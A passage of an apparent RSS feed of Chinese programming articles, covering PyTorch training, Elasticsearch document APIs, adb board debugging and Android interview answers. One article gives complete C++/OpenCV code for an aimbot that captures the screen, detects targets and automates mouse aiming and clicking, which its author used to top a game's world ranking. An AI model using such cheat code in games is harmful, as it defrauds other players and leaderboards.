总体而言，开发一个微信小程序的费用从几千元到几十万元不等。在决定开发小程序之前，需要明确自己的需求和预算，选择合适的开发团队，进行充分的沟通和协商，以确保最终的开发成本在可承受范围内，同时也能获得一个满足自身需求的高质量微信小程序。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540201.html</guid><pubDate>Fri, 31 Oct 2025 07:28:12 +0000</pubDate></item><item><title>反向传播和优化 pytorch</title><link>https://www.ppmy.cn/news/1540202.html</link><description>**前置知识：
优化器：optim=torch.optim.SGD(xigua1.parameters(),lr=0.01) 传入模型的参数、学习速率
计算损失：result_loss=loss(outputs,targets)
梯度清零：
optim.
zero_grad()
计算梯度并反向传播：
result_loss.
backward()
更新参数：
optim.
step()
optim.zero_grad()
: 在每次训练迭代之前清除所有优化器（如SGD、Adam等）维护的梯度信息。在神经网络中，每个参数（如权重和偏置）都有一个与之关联的梯度，这个梯度表示参数对损失函数的贡献程度。随着训练的进行，这些梯度会被累积，如果不加以重置，会导致梯度累加，从而影响模型的学习效果。因此，
zero_grad()
函数通过将这些梯度重置为零，确保了每次迭代都是在无偏见的情况下开始。
result_loss.backward()
: 执行反向传播算法，计算损失函数相对于模型参数的梯度。在神经网络前向传播过程中，网络输出与实际标签之间的差异被量化为损失函数。
backward()
函数通过链式法则自动计算损失函数对每个参数的梯度，这些梯度随后被存储在相应的参数的
.grad
属性中。
这一步是优化过程的核心，因为它直接关系到参数如何被调整以最小化损失。
optim.step()
: 在计算出损失函数的梯度后，
step()
函数根据这些梯度来更新模型参数。优化器使用特定的算法（如梯度下降、Adam等）来决定如何更新每个参数，以便在下一次迭代中减少损失。简而言之，
step()
函数实现了从当前参数状态向更优参数状态的“跳跃”。
总的来说，这三个函数协同工作，形成了深度学习中参数优化的基本流程：首先清除旧的梯度信息，然后计算新的梯度，最后根据这些梯度更新参数。这一过程在每次训练迭代中重复进行，直到模型的性能满足要求或达到预设的停止条件。
**代码：
import torch
import torchvision.datasets
from torch import nn
from torch.nn import Conv2d, MaxPool2d, Flatten, Linear, Sequential
from torch.utils.data import DataLoader
from torch.utils.tensorboard import SummaryWriter#以CIFAR10的分类检测为例test_set=torchvision.datasets.CIFAR10(root="./dataset",train=False,transform=torchvision.transforms.ToTensor(),download=True)
dataloader=DataLoader(test_set,batch_size=1)class Xigua(nn.Module):def __init__(self):super().__init__()self.model1=Sequential(Conv2d(3,32,5,padding=2),MaxPool2d(2),Conv2d(32,32,5,padding=2),MaxPool2d(2),Conv2d(32,64,5,padding=2),MaxPool2d(2),Flatten(),Linear(1024,64),Linear(64,10),)def forward(self,x):x=self.model1(x)return xxigua1=Xigua()
loss=nn.CrossEntropyLoss()
optim=torch.optim.SGD(xigua1.parameters(),lr=0.01)#为了节省时间，这里能显示出优化的效果即可，就只训练5轮，每轮都只是计算前10个数据
for epoch in range(5): #训练5轮running_loss=0.0 #每轮都计算出一个所有数据损失的总和step=0for data in dataloader:imgs,targets=dataoutputs=xigua1(imgs)result_loss=loss(outputs,targets)optim.zero_grad() #将梯度清零result_loss.backward() #计算损失对应的梯度，并将其反向传播optim.step() #更新模型参数#loss函数在其中只是起到了一个提供梯度的作用，而这个梯度就藏在optim中running_loss+=result_lossstep+=1if step&gt;=10:breakprint(running_loss)</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540202.html</guid><pubDate>Fri, 31 Oct 2025 07:28:14 +0000</pubDate></item><item><title>C++ OpenCV实现简单的自瞄脚本（OpenCV实战）</title><link>https://www.ppmy.cn/news/1540203.html</link><description>练枪的时候发现打的靶子特征很醒目，而且操控的逻辑也不是说特别难，刚好会一点点C++和OpenCV，为什么不试试写一个小程序来帮助我们瞄准呢？
实现效果
我们主要是通过这款游戏测试自瞄
简单的调参之后本周世界排名也是打到了第一名，下面是实现的简单思路和逻辑，可以跟着我一起实战一下
主要思路讲解
我们实际上实现自动瞄准的逻辑也很简单
识别目标，确定目标坐标，移动鼠标，开枪
实现这四步就可以很简单的实现自瞄，转化为代码，我们则需要做到下面两个步骤
目标识别检测
鼠标位置控制
下面我们分别来讲解实现这两个功能
目标识别
这里用的是OpenCV来实现检测，因为这一次的目标比较简单，大概都是这样的蓝色小圆球
其实这里面思路有很多，可以进行进行边缘检测，阈值监测什么的，但是毕竟是自瞄，我们要选择一个计算任务小的，这样子响应速度更快
如果是识别圆形轮廓，就分为了利用算子进行边缘检测，识别圆形轮廓，这样子不仅计算量大，在手枪出现挡住靶子的情况也没有办法及时识别（上图所示），于是我们果断抛弃这种思路。
ps:为了方便看效果，我简单的写一个小程序来显示图片，捕获屏幕和移动鼠标后面会讲到，这里我放一下测试的小程序
int
main
(
)
{
Mat img
=
cv
::
imread
(
"D:\desktop\\test.png"
)
;
while
(
true
)
{
cv
::
imshow
(
"Original Image"
,
img
)
;
cv
::
waitKey
(
100
)
;
}
}
还有一种思路，我们直接
寻找蓝色
，这样子也分为以下几个步骤
创建一个掩膜，只保留蓝色区域
Scalar lower_blue(82, 199, 118);Scalar upper_blue(97, 255, 255);
使用掩膜提取蓝色区域
Mat mask;inRange(hsv, lower_blue, upper_blue, mask);
查找轮廓
Canny(mask, edges, 80, 255);
接下来就是确定鼠标点击的点，在这里也是测试了多种情况，最好的办法是直接识别质心，这样子可以使得鼠标的容错会更大，如何去除误识别区域呢，这个通过优化算法可以达到很好的效果，但是会极大地增大延时，所以在前面蓝色区域识别以及很精确地调试过了，这里只需要规定目标轮廓体积达到阈值即可
我们写一下代码，首先是质心的寻找
// 存储找到的轮廓vector&lt;vector&lt;Point&gt;&gt; contours;// 在经过边缘检测的图像 edges 中查找轮廓// RETR_EXTERNAL 表示只提取最外层的轮廓// CHAIN_APPROX_SIMPLE 表示对轮廓进行简化，只保留轮廓的端点findContours(edges, contours, RETR_EXTERNAL, CHAIN_APPROX_SIMPLE);// 初始化最近轮廓的中心为一个无效的点(-1,-1)Point closestContourCenter(-1, -1);
那接下来就是找到并画出圆心
for (const auto&amp; contour : contours){Moments contourMoments = moments(contour);if (contourMoments.m00!= 0.0){// 根据矩计算轮廓的中心位置（质心）Point contourCenter(contourMoments.m10 / contourMoments.m00, contourMoments.m01 / contourMoments.m00);// 在图像上标记质心circle(img, contourCenter, 5, Scalar(0, 0, 255), -1);cout &lt;&lt; "质心坐标: (" &lt;&lt; contourCenter.x &lt;&lt; ", " &lt;&lt; contourCenter.y &lt;&lt; ")" &lt;&lt; endl;}}
这样子我们就成功找到了需要射击的点
屏幕捕获
我们需要引用一个系统库
#include &lt;windows.h&gt;
以及这个函数
Mat captureScreen()
{// 获取显示器的大小int screenWidth = GetSystemMetrics(SM_CXSCREEN);int screenHeight = GetSystemMetrics(SM_CYSCREEN);// 创建设备描述表HDC hSrcDC = GetDC(0); // 获取整个桌面的设备上下文HDC hMemDC = CreateCompatibleDC(hSrcDC); // 创建与桌面兼容的设备上下文// 创建位图对象，并准备将其存储在内存中HBITMAP hBitmap = CreateCompatibleBitmap(hSrcDC, screenWidth, screenHeight);HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemDC, hBitmap);// 将屏幕复制到位图中BitBlt(hMemDC, 0, 0, screenWidth, screenHeight, hSrcDC, 0, 0, SRCCOPY);// 从位图中获取像素数据Mat screen(screenHeight, screenWidth, CV_8UC4);BYTE* data = (BYTE*)screen.data;GetBitmapBits(hBitmap, screenWidth * screenHeight * 4, data);// 清理SelectObject(hMemDC, hOldBitmap);DeleteObject(hBitmap);DeleteDC(hMemDC);ReleaseDC(0, hSrcDC);return screen;
}
然后两行代码就可以实现了
int
main
(
)
{
namedWindow
(
"screen capture"
,
WINDOW_NORMAL
)
;
while
(
true
)
{
Mat screen
=
captureScreen
(
)
;
// 显示捕获的屏幕图像
imshow
(
"screen capture"
,
screen
)
;
waitKey
(
100
)
;
}
return
0
;
}
打靶子！
其实打靶子就是移动鼠标然后点击
我们需要一些函数来移动鼠标和点击，这里同样还是windows.h库
大家直接用就好
POINT GetMouseCurPoint()
{POINT mypoint;GetCursorPos(&amp;mypoint);//获取鼠标当前所在位置return mypoint;}void MouseLeftDown()//鼠标左键按下 
{INPUT  Input = { 0 };Input.type = INPUT_MOUSE;Input.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;SendInput(1, &amp;Input, sizeof(INPUT));
}void MouseLeftUp()//鼠标左键放开 
{INPUT  Input = { 0 };Input.type = INPUT_MOUSE;Input.mi.dwFlags = MOUSEEVENTF_LEFTUP;SendInput(1, &amp;Input, sizeof(INPUT));
}void MouseMove(int x, int y)//鼠标移动到指定位置 
{double fScreenWidth = ::GetSystemMetrics(SM_CXSCREEN) - 1;//获取屏幕分辨率宽度 double fScreenHeight = ::GetSystemMetrics(SM_CYSCREEN) - 1;//获取屏幕分辨率高度 double fx = x * (65535.0f / fScreenWidth);double fy = y * (65535.0f / fScreenHeight);//printf("fScreenWidth %lf , fScreenHeight %lf, fx %lf, fy %lf \n", fScreenWidth, fScreenHeight, fx, fy);INPUT  Input = { 0 };Input.type = INPUT_MOUSE;Input.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE;Input.mi.dx = fx;Input.mi.dy = fy;SendInput(1, &amp;Input, sizeof(INPUT));
}
有了这些库就能很轻松的操控鼠标点击
但是常玩fps的大家都知道，准星移动是滑动的，起始点都是屏幕中心，目标点是靶子的位置
所以我也是写了一个滑动鼠标的函数，这里我们需要用到PID来控制鼠标轨迹
从网上随便找一份PID类
class PIDController
{
public
:
PIDController
(
double
Kp
,
double
Ki
,
double
Kd
)
:
Kp
(
Kp
)
,
Ki
(
Ki
)
,
Kd
(
Kd
)
,
lastError
(
0
)
,
integral
(
0
)
{
}
// Update the position based on error between current and target
void
updatePosition
(
POINT
&amp;
current
,
const
POINT
&amp;
target
,
double
dt
)
{
int
errorX
=
target
.
x
-
current
.
x
;
int
errorY
=
target
.
y
-
current
.
y
;
// Proportional term
double
pTermX
=
Kp
*
errorX
;
double
pTermY
=
Kp
*
errorY
;
// Integral term (not used in this simple example)
integral
+=
errorX
+
errorY
;
// This is a simplification
double
iTermX
=
Ki
*
integral
*
dt
;
double
iTermY
=
Ki
*
integral
*
dt
;
// Derivative term (not used in this simple example)
double
dTermX
=
Kd
*
(
errorX
-
lastError
)
;
double
dTermY
=
Kd
*
(
errorY
-
lastError
)
;
// Update position
current
.
x
+=
pTermX
;
// + iTermX + dTermX;
current
.
y
+=
pTermY
;
// + iTermY + dTermY;
// Save error for next derivative calculation
lastError
=
errorX
+
errorY
;
}
private
:
double
Kp
,
Ki
,
Kd
;
double
lastError
;
double
integral
;
}
;
然后就是无聊的调参了，这里已经帮大家调教好了
void
moveFromTo
(
POINT start
,
POINT target
,
double
dt
)
{
PIDController
pid
(
0.1
,
0
,
0
)
;
// Kp, Ki, Kd values
POINT current
=
start
;
while
(
abs
(
current
.
x
-
target
.
x
)
&gt;
10
||
abs
(
current
.
y
-
target
.
y
)
&gt;
10
)
{
pid
.
updatePosition
(
current
,
target
,
dt
)
;
std
::
cout
&lt;&lt;
"Current Position: ("
&lt;&lt;
current
.
x
&lt;&lt;
", "
&lt;&lt;
current
.
y
&lt;&lt;
")"
&lt;&lt;
std
::
endl
;
MouseMove
(
current
.
x
,
current
.
y
)
;
printf
(
"1\n"
)
;
}
}
这里有个小细节，因为是PID控制的鼠标，有些时候可能会震荡时间过长，我的解决方法就是扩大目标范围，在范围内直接点击就好
那么综上所述，
我们就只剩最后一件事情了
设计打靶顺序可以很好的提高效率，我随便写了一份最简单的，大家要是有好想法可以在评论区分享
我的想法是找到离屏幕中心点距离最近的点优先考虑，这样子的坏处是计算量比较大，可能耗时很多，最终也是只能打到十七万分
// 获取图像的宽度
int
width
=
screen
.
cols
;
// 获取图像的高度
int
height
=
screen
.
rows
;
// 初始化最小距离为最大的双精度浮点数
double
mindistance
=
DBL_MAX
;
// 初始化最近轮廓的中心为一个无效的点(-1,-1)
Point
closestContourCenter
(
-
1
,
-
1
)
;
// 遍历找到的所有轮廓
for
(
const
auto
&amp;
contour
:
contours
)
{
// 计算当前轮廓的矩
Moments contourMoments
=
moments
(
contour
)
;
// 检查矩中的零阶矩是否为非零值，如果为零则说明轮廓不存在或无效
if
(
contourMoments
.
m00
!=
0.0
)
{
// 根据矩计算轮廓的中心位置
// m10/m00 为 x 坐标，m01/m00 为 y 坐标
Point
contourCenter
(
contourMoments
.
m10
/
contourMoments
.
m00
,
contourMoments
.
m01
/
contourMoments
.
m00
)
;
// 计算当前轮廓中心与图像中心（假设图像中心为(960,540)）的水平距离差
double
dx
=
960
-
contourCenter
.
x
;
// 计算当前轮廓中心与图像中心（假设图像中心为(960,540)）的垂直距离差
double
dy
=
540
-
contourCenter
.
y
;
// 计算当前轮廓中心与图像中心的欧氏距离
double
distance
=
sqrt
(
dx
*
dx
+
dy
*
dy
)
;
// 如果当前轮廓中心与图像中心的距离小于之前找到的最小距离
if
(
distance
&lt;
mindistance
)
{
// 更新最小距离
mindistance
=
distance
;
// 更新最近轮廓中心
closestContourCenter
=
contourCenter
;
}
}
}
最终整合
到此为止以及完成了所有的准备工作，我们可以识别到目标，可以移动可以点击
但是还是有一个问题就是程序退出的问题，如果程序一直运行将一直拉扯你的鼠标让你无法点击只能重启（别问我是怎么知道的）
这里有一个好办法就是使用时间库来控制程序执行时间，打靶一局一分钟，可以把程序设置成一分五秒自动结束
// 记录开始时间
auto
starttime
=
std
::
chrono
::
steady_clock
::
now
(
)
;
// 设置结束时间为开始时间加上 4 分钟
auto
endtime
=
starttime
+
std
::
chrono
::
minutes
(
1
)
+
std
::
chrono
::
seconds
(
5
)
;
// 获取当前时间
auto
currenttime
=
std
::
chrono
::
steady_clock
::
now
(
)
;
// 如果当前时间大于等于结束时间
if
(
currenttime
&gt;=
endtime
)
{
// 跳出循环
break
;
}
记得引用
#include &lt;chrono&gt;
好的那么接下来就是开始实战
我们需要先打开游戏，打开游戏的窗口模式，监测窗口小图标的位置，在程序一开始的时候先点击游戏最小化的图标，然后点击继续游戏，然后开始打靶子
那屏幕上的位置需要大家用提到的函数来自行测试
// 打印最近的轮廓中心if (closestContourCenter.x!= -1 &amp;&amp; closestContourCenter.y!= -1){std::cout &lt;&lt; "closest contour center: (" &lt;&lt; closestContourCenter.x &lt;&lt; ", " &lt;&lt; closestContourCenter.y &lt;&lt; ")" &lt;&lt; std::endl;start = GetMouseCurPoint();POINT aid = { closestContourCenter.x, closestContourCenter.y };// 从一个点移动到另一个点moveFromTo(target4, aid, 0.001);MouseLeftDown();MouseLeftUp();}
这一步是打靶子的逻辑，大家可以试试看，0.001是调好的dt，不用再管他
完整代码
main.cpp(前面需要小小改动)
#define _CRT_SECURE_NO_WARNINGS 1
#include "sa.h"
using namespace cv;int main()
{// 获取鼠标当前位置并输出POINT mousePos = GetMouseCurPoint();std::cout &lt;&lt; "mouse position: " &lt;&lt; mousePos.x &lt;&lt; "," &lt;&lt; mousePos.y &lt;&lt; std::endl;// 记录起始位置POINT start = GetMouseCurPoint();POINT target = { 0, 0 };// 模拟鼠标左键按下和抬起MouseLeftDown();MouseLeftUp();POINT target1 = { 178, 345 };POINT target2 = { 1780, 50 };POINT target4 = { 960, 531 };std::cout &lt;&lt; "起始位置: (" &lt;&lt; start.x &lt;&lt; ", " &lt;&lt; start.y &lt;&lt; ")" &lt;&lt; std::endl;// 从起始位置移动到目标位置// 这两次点击一次是打开游戏，一次是点击继续游戏（根据自己的屏幕来修改）moveFromTo(start, target2, 0.05);MouseLeftDown();MouseLeftUp();start = GetMouseCurPoint();moveFromTo(start, target1, 0.05);MouseLeftDown();MouseLeftUp();Sleep(1000);MouseLeftDown();MouseLeftUp();// 初始化一个窗口，窗口大小可调整namedWindow("screen capture", WINDOW_NORMAL);// 记录开始时间auto starttime = steady_clock::now();// 设置结束时间为开始时间加上 4 分钟auto endtime = starttime + minutes(4);while (true){// 捕获屏幕Mat screen = captureScreen();// 转换为 BGR 格式以便后续处理cvtColor(screen, screen, COLOR_BGRA2BGR);// 将 BGR 颜色空间转换为 HSV 颜色空间Mat hsv;cvtColor(screen, hsv, COLOR_BGR2HSV);// 定义蓝色在 HSV 空间的下界和上界Scalar lower_blue(82, 199, 118);Scalar upper_blue(97, 255, 255);// 创建一个掩膜，只保留蓝色区域Mat mask;inRange(hsv, lower_blue, upper_blue, mask);// 使用掩膜提取蓝色区域，对掩膜进行边缘检测Mat edges;Canny(mask, edges, 80, 255);// 显示边缘检测结果imshow("edges", edges);// 查找轮廓vector&lt;vector&lt;Point&gt;&gt; contours;findContours(edges, contours, RETR_EXTERNAL, CHAIN_APPROX_SIMPLE);int width = screen.cols;int height = screen.rows;double mindistance = DBL_MAX;Point closestContourCenter(-1, -1);for (const auto&amp; contour : contours){// 计算轮廓的矩Moments contourMoments = moments(contour);if (contourMoments.m00 != 0.0){// 根据矩计算轮廓中心Point contourCenter(contourMoments.m10 / contourMoments.m00, contourMoments.m01 / contourMoments.m00);// 手动计算两点之间的距离double dx = 960 - contourCenter.x;double dy = 540 - contourCenter.y;double distance = sqrt(dx * dx + dy * dy);if (distance &lt; mindistance){// 更新最小距离和最近轮廓中心mindistance = distance;closestContourCenter = contourCenter;}}}// 创建一个图像用于绘制轮廓和最近的轮廓中心Mat drawing = Mat::zeros(screen.size(), screen.type());// 在图像上绘制轮廓drawContours(drawing, contours, -1, Scalar(0, 255, 0), 2, LINE_8, vector&lt;Vec4i&gt;(), 0, Point());if (closestContourCenter.x != -1 &amp;&amp; closestContourCenter.y != -1){// 在图像上绘制最近的轮廓中心和图像中心circle(drawing, closestContourCenter, 5, Scalar(0, 0, 255), -1);circle(drawing, Point(960, 540), 5, Scalar(255, 0, 0), -1);}// 显示捕获到的屏幕图像//imshow("screen capture", drawing);// 打印最近的轮廓中心if (closestContourCenter.x != -1 &amp;&amp; closestContourCenter.y != -1){std::cout &lt;&lt; "closest contour center: (" &lt;&lt; closestContourCenter.x &lt;&lt; ", " &lt;&lt; closestContourCenter.y &lt;&lt; ")" &lt;&lt; std::endl;start = GetMouseCurPoint();POINT aid = { closestContourCenter.x, closestContourCenter.y };// 从一个点移动到另一个点moveFromTo(target4, aid, 0.001);MouseLeftDown();MouseLeftUp();}// 检查是否有按键按下if (waitKey(1) &gt;= 0) break;MouseLeftDown();MouseLeftUp();Sleep(100);// 获取当前时间auto currenttime = steady_clock::now();if (currenttime &gt;= endtime){break;}}// 释放资源destroyAllWindows();return 0;
}
函数文件demo.cpp
#define _CRT_SECURE_NO_WARNINGS 1
#include "sa.h"POINT GetMouseCurPoint()
{POINT mypoint;GetCursorPos(&amp;mypoint);//获取鼠标当前所在位置return mypoint;}void MouseMove(int x, int y)//鼠标移动到指定位置 
{double fScreenWidth = ::GetSystemMetrics(SM_CXSCREEN) - 1;//获取屏幕分辨率宽度 double fScreenHeight = ::GetSystemMetrics(SM_CYSCREEN) - 1;//获取屏幕分辨率高度 double fx = x * (65535.0f / fScreenWidth);double fy = y * (65535.0f / fScreenHeight);//printf("fScreenWidth %lf , fScreenHeight %lf, fx %lf, fy %lf \n", fScreenWidth, fScreenHeight, fx, fy);INPUT  Input = { 0 };Input.type = INPUT_MOUSE;Input.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE;Input.mi.dx = fx;Input.mi.dy = fy;SendInput(1, &amp;Input, sizeof(INPUT));
}void moveFromTo(POINT start, POINT target, double dt) {PIDController pid(0.1, 0, 0); // Kp, Ki, Kd valuesPOINT current = start;while (abs(current.x - target.x) &gt; 10 || abs(current.y - target.y) &gt; 10) {pid.updatePosition(current, target, dt);std::cout &lt;&lt; "Current Position: (" &lt;&lt; current.x &lt;&lt; ", " &lt;&lt; current.y &lt;&lt; ")" &lt;&lt; std::endl;MouseMove(current.x, current.y);printf("1\n");}
}void MouseLeftDown()//鼠标左键按下 
{INPUT  Input = { 0 };Input.type = INPUT_MOUSE;Input.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;SendInput(1, &amp;Input, sizeof(INPUT));
}void MouseLeftUp()//鼠标左键放开 
{INPUT  Input = { 0 };Input.type = INPUT_MOUSE;Input.mi.dwFlags = MOUSEEVENTF_LEFTUP;SendInput(1, &amp;Input, sizeof(INPUT));
}void MouseRightDown()//鼠标右键按下 
{INPUT  Input = { 0 };Input.type = INPUT_MOUSE;Input.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;SendInput(1, &amp;Input, sizeof(INPUT));
}void MouseRightUp()//鼠标右键放开 
{INPUT  Input = { 0 };Input.type = INPUT_MOUSE;Input.mi.dwFlags = MOUSEEVENTF_RIGHTUP;SendInput(1, &amp;Input, sizeof(INPUT));
}Mat captureScreen()
{// 获取显示器的大小int screenWidth = GetSystemMetrics(SM_CXSCREEN);int screenHeight = GetSystemMetrics(SM_CYSCREEN);// 创建设备描述表HDC hSrcDC = GetDC(0); // 获取整个桌面的设备上下文HDC hMemDC = CreateCompatibleDC(hSrcDC); // 创建与桌面兼容的设备上下文// 创建位图对象，并准备将其存储在内存中HBITMAP hBitmap = CreateCompatibleBitmap(hSrcDC, screenWidth, screenHeight);HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemDC, hBitmap);// 将屏幕复制到位图中BitBlt(hMemDC, 0, 0, screenWidth, screenHeight, hSrcDC, 0, 0, SRCCOPY);// 从位图中获取像素数据Mat screen(screenHeight, screenWidth, CV_8UC4);BYTE* data = (BYTE*)screen.data;GetBitmapBits(hBitmap, screenWidth * screenHeight * 4, data);// 清理SelectObject(hMemDC, hOldBitmap);DeleteObject(hBitmap);DeleteDC(hMemDC);ReleaseDC(0, hSrcDC);return screen;
}
库文件sa.h
#
pragma
once
#
include
&lt;iostream&gt;
#
include
&lt;windows.h&gt;
#
include
&lt;cmath&gt;
#
include
&lt;opencv2/opencv.hpp&gt;
#
include
&lt;chrono&gt;
using namespace std
;
using namespace cv
;
using namespace std
::
chrono
;
// 使用chrono命名空间
POINT
GetMouseCurPoint
(
)
;
void
MouseMove
(
int
x
,
int
y
)
;
//鼠标移动到指定位置
void
moveFromTo
(
POINT start
,
POINT target
,
double
dt
)
;
void
MouseLeftDown
(
)
;
void
MouseLeftUp
(
)
;
//鼠标左键放开
void
MouseRightDown
(
)
;
//鼠标右键按下
void
MouseRightUp
(
)
;
//鼠标右键放开
Mat
captureScreen
(
)
;
class PIDController
{
public
:
PIDController
(
double
Kp
,
double
Ki
,
double
Kd
)
:
Kp
(
Kp
)
,
Ki
(
Ki
)
,
Kd
(
Kd
)
,
lastError
(
0
)
,
integral
(
0
)
{
}
// Update the position based on error between current and target
void
updatePosition
(
POINT
&amp;
current
,
const
POINT
&amp;
target
,
double
dt
)
{
int
errorX
=
target
.
x
-
current
.
x
;
int
errorY
=
target
.
y
-
current
.
y
;
// Proportional term
double
pTermX
=
Kp
*
errorX
;
double
pTermY
=
Kp
*
errorY
;
// Integral term (not used in this simple example)
integral
+=
errorX
+
errorY
;
// This is a simplification
double
iTermX
=
Ki
*
integral
*
dt
;
double
iTermY
=
Ki
*
integral
*
dt
;
// Derivative term (not used in this simple example)
double
dTermX
=
Kd
*
(
errorX
-
lastError
)
;
double
dTermY
=
Kd
*
(
errorY
-
lastError
)
;
// Update position
current
.
x
+=
pTermX
;
// + iTermX + dTermX;
current
.
y
+=
pTermY
;
// + iTermY + dTermY;
// Save error for next derivative calculation
lastError
=
errorX
+
errorY
;
}
private
:
double
Kp
,
Ki
,
Kd
;
double
lastError
;
double
integral
;
}
;
程序是突发奇想的产物，还有很多的不足，大家如果有更好的建议可以在评论区指出
谢谢大家的观看！！！</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540203.html</guid><pubDate>Fri, 31 Oct 2025 07:28:15 +0000</pubDate></item><item><title>【RV1126】板子adb 调试流程</title><link>https://www.ppmy.cn/news/1540204.html</link><description>1. 连接电源线，网线
2. 打开终端
adb connect 192.168.2.99
3.进入设备
adb shell
4.开始推流
cd /oem/usr/bin
./rkmedia_vi_venc_rtsp_test -a /etc/iqfiles/ -I 0
-I 0 选择的摄像头序号，可以选择0或1
5.查看相机参数
v4l2-ctl --device=/dev/video0 --list-formats-ext</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540204.html</guid><pubDate>Fri, 31 Oct 2025 07:28:18 +0000</pubDate></item><item><title>CVTE Android面试题及参考答案</title><link>https://www.ppmy.cn/news/1540205.html</link><description>Activity 的生命周期
Activity 的生命周期分为以下几个主要状态：
onCreate ()：在 Activity 第一次被创建的时候调用。通常在这个方法中进行一些初始化操作，如设置布局、初始化成员变量等。这是 Activity 进入可见状态的第一步。
onStart ()：当 Activity 即将对用户可见的时候调用。此时 Activity 已经在前台，但可能还没有获得焦点，用户可能还看不到它的具体内容。
onResume ()：在 Activity 准备好和用户进行交互的时候调用。此时 Activity 处于运行状态，位于前台并获得了焦点。
onPause ()：当 Activity 失去焦点但仍然可见的时候调用。通常在这个方法中暂停一些耗费 CPU 资源的操作，如动画、视频播放等，同时保存一些关键数据，因为这个时候另一个 Activity 可能正在启动并即将覆盖当前 Activity。
onStop ()：当 Activity 完全不可见的时候调用。此时可以释放一些占用资源较多的对象，如网络连接、数据库连接等。
onDestroy ()：在 Activity 被销毁之前调用。可以在这里进行最终的清理工作，如释放资源、取消注册的监听器等。
Activity 的生命周期是一个复杂的</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540205.html</guid><pubDate>Fri, 31 Oct 2025 07:28:21 +0000</pubDate></item><item><title>022 elasticsearch文档管理(添加、修改、删除、批处理)</title><link>https://www.ppmy.cn/news/1540206.html</link><description>文章目录
添加文档
修改文档
删除文档
根据_id取文档
使用批处理_bulk
PortX： 
https://portx.online/zh
MobaXterm： 
https://mobaxterm.mobatek.net/
FinalShell： 
http://www.hostbuf.com/
添加文档
向索引中添加一行数据
使用json来表示
使用restful形式的api来实现
put:添加
post:修改
delete:删除
方法:put
url:http://localhost:9200/{索引}/_doc/{_id}
文档的id(_id)推荐和真正数据的id保持一致。
请求体：
尽量和mapping设置的文档格式保持一致
创建索引
PUT
/
blog
{
"settings"
:
{
"number_of_shards"
:
5
,
"number_of_replicas"
:
1
}
,
"mappings"
:
{
"properties"
:
{
"id"
:
{
"type"
:
"long"
}
,
"title"
:
{
"type"
:
"text"
,
"analyzer"
:
"standard"
,
"store"
:
true
}
,
"content"
:
{
"type"
:
"text"
,
"analyzer"
:
"standard"
,
"store"
:
true
}
,
"comment"
:
{
"type"
:
"text"
,
"analyzer"
:
"standard"
,
"store"
:
true
}
,
"mobile"
:
{
"type"
:
"keyword"
,
"index"
:
true
,
"store"
:
true
}
}
}
}
添加文档
PUT
/
blog
/
_doc
/
1
{
"id"
:
1
,
"title"
:
"家装厨卫以旧换新释放消费潜力"
,
"content"
:
"近期，在消费品以旧换新政策支持下，各地不断加力促消费、惠民生。其中，家装厨卫是支持的重要领域之一，多地出台补贴政策、开展促销活动，对旧房翻新、局部改造等进行补贴。系列举措在提升消费者居住环境的同时，也释放了消费潜力、激发了市场活力。"
,
"comment"
:
"家装厨卫"
,
"mobile"
:
"111111"
}
PUT
/
blog
/
_doc
/
2
{
"id"
:
2
,
"title"
:
"谨防黑话烂梗的隐性侵蚀"
,
"content"
:
"“雨女无瓜”“尊嘟假嘟”“你个老六”“丸辣”“细狗”……一段时间以来，各种网络黑话烂梗频频出现，让人云里雾里、摸不着头脑，更在孩子之间口口相传，成了“校园社交”的某种硬通货。其中，有的烂梗毫无营养，内容空洞、语义歪曲；有的黑话隐晦表达，含沙射影、充满恶趣。显然，网络平台流行的黑话烂梗，不符合国家通用语言文字的规范使用表达，更对未成年人的日常交流和思维价值形成隐性侵蚀，极易引发不良后果。"
,
"comment"
:
"黑话烂梗"
,
"mobile"
:
"111111"
}
修改文档
方法:post
url:http://localhost:9200/{索引}/_doc/{_id}
请求体:
和添加格式一模一样
修改原理：先删除后添加
删除文档
方法:delete
url:http://localhost:9200/{索引}/_doc/{_id}
根据_id取文档
方法:get
url:http://localhost:9200/{索引}/_doc/{_id}
使用批处理_bulk
方法:put,post
url:http://localhost:9200/{索引}/_bulk
请求体:
{
action
:
{
metadata
}
}
{
请求体数据信息json格式
}
{
action
:
{
metadata
}
}
{
请求体数据信息json格式
}
{
action
:
{
metadata
}
}
{
请求体数据信息json格式
}
需要有一个换行
例如：
请求方法：post
url:http://localhost:9200/blog/_bulk
请求体:
action对应的取值：
create：创建一个文档，如果文档不存在就创建
index：创建一个新的文档，如果文档存在就更新
update：批量更新文档
delete：批量删除，不需要有请求体
元数据：
_index：要写入的索引信息
_type: 要写入的type
_id：要写入文档的id
{
"index"
:
{
"_id"
:
1
}
}
{
"id"
:
1
,
"title"
:
"家装厨卫以旧换新释放消费潜力"
,
"content"
:
"近期，在消费品以旧换新政策支持下，各地不断加力促消费、惠民生。其中，家装厨卫是支持的重要领域之一，多地出台补贴政策、开展促销活动，对旧房翻新、局部改造等进行补贴。系列举措在提升消费者居住环境的同时，也释放了消费潜力、激发了市场活力。"
,
"comment"
:
"家装厨卫"
,
"mobile"
:
"111111"
}
{
"index"
:
{
"_id"
:
2
}
}
{
"id"
:
2
,
"title"
:
"家装厨卫以旧换新释放消费潜力"
,
"content"
:
"近期，在消费品以旧换新政策支持下，各地不断加力促消费、惠民生。其中，家装厨卫是支持的重要领域之一，多地出台补贴政策、开展促销活动，对旧房翻新、局部改造等进行补贴。系列举措在提升消费者居住环境的同时，也释放了消费潜力、激发了市场活力。"
,
"comment"
:
"家装厨卫"
,
"mobile"
:
"111111"
}
{
"index"
:
{
"_id"
:
3
}
}
{
"id"
:
3
,
"title"
:
"家装厨卫以旧换新释放消费潜力"
,
"content"
:
